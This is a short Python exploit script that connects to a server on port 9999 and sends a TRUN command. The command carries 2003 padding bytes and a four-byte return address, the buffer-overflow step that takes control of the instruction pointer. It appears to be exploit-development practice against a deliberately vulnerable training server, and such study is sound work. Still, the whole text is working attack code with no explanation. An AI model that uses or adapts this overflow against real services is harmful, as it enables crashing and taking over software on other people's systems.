#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('0.0.0.0',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:
    print("error connecting to server")
    sys.exit()